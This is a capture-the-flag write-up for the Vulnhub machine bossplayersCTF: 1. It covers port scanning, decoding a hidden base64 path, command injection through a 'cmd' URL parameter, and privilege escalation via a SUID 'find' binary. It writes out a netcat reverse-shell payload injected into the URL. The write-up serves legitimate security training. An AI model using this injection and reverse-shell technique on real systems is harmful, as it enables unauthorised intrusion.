# CTF-Write-up

## Vulnhub: bossplayersCTF: 1

##### URL: https://www.vulnhub.com/entry/bossplayersctf-1,375/

##### Created by _https://www.vulnhub.com/author/cuong-nguyen,649/_

![logo](https://user-images.githubusercontent.com/20625004/161815571-55e220df-8854-4ac1-8d5d-bd3ad6aa0339.PNG)

First run ``nmap`` to identify open ports.

![nmap](https://user-images.githubusercontent.com/20625004/164456576-e175cdb0-b5bb-42e5-94ed-2458c8a1e453.PNG)

Lets access port ``80``.

![80](https://user-images.githubusercontent.com/20625004/164456674-75417553-5d59-498a-b5c2-e0fdfe2fde02.PNG)

Nothing there, but lets check also ``view page source`` of the page, and we found a comment.

![comment](https://user-images.githubusercontent.com/20625004/164456938-5726a38f-2972-4193-8318-1894852238f5.PNG)

It seemed like Base64, so decode it using ``base64`` command. The output shows another encodeded text, it seems like ``base64``, so decoded it again, now
we found something interesting a path.

![base64](https://user-images.githubusercontent.com/20625004/164457930-258c0850-2322-4a66-b4f6-089e0820d2e5.PNG)

Access the new page.

![php](https://user-images.githubusercontent.com/20625004/164458185-1d8e0e27-d26f-4ef2-ae3e-c399dd7f73b9.PNG)

It seems to be a to-do list, from the list we understand that ``ping`` and ``privilege escalation`` are not fixed yet.
``ping`` from the list indicates a ``command injection`` might exist, lets use the ``cmd`` parameter to see.

![ping](https://user-images.githubusercontent.com/20625004/164458891-6d15bf00-4168-4e1e-8b42-01f80d78a9eb.PNG)

![ping1](https://user-images.githubusercontent.com/20625004/164459059-6e9237ab-4c1c-499c-8164-fb41758866ff.PNG)

Success ``command injection`` is working. The ``cmd`` parameter is working and we added ``id`` and ``ls -l`` commands as parameter values.

The next step here is to obtain shell access.

Open a listener ``nc -lvnp port``, then we enter in the url the command ``nc -e /bin/bash <your IP> port`` this will open a shell.

``http://<Target IP>/workinginprogress.php?cmd=nc -e /bin/bash <your IP> port``

![access](https://user-images.githubusercontent.com/20625004/164460639-acea9da4-bbb1-43c3-94df-83ffe895ea64.PNG)

Back on our listener we have successfully obtained a shell and entered the system.

You can use ``python -c 'import pty; pty.spawn("/bin/bash")'`` command to upgrade the dumb shell.

![system1](https://user-images.githubusercontent.com/20625004/164462346-a9ce9a02-a471-4c6a-ba3a-fe052331ac66.PNG)

After enumaration and searching around, then we search for ``SUID (Set owner User ID up on execution)`` permissions.

![find](https://user-images.githubusercontent.com/20625004/164463852-415044ae-439e-4530-a4cd-7fbbb6e72c2f.PNG)

Now we enumerated the target machine for the list of commands that the user is allowed to execute without root permissions, and we found that the ``find`` command can be executed with ``root`` privileges.

![escalate](https://user-images.githubusercontent.com/20625004/164465394-5dfa66a3-4e37-4ff7-86a3-210d80d7a290.PNG)

With help from ``https://gtfobins.github.io/gtfobins/find/`` we have escalated our privileges and on ``root`` folder you will find the flag in ``base64`` encoding.

![flag](https://user-images.githubusercontent.com/20625004/164465724-a240506e-cffb-4293-be07-9be6f535275a.PNG)

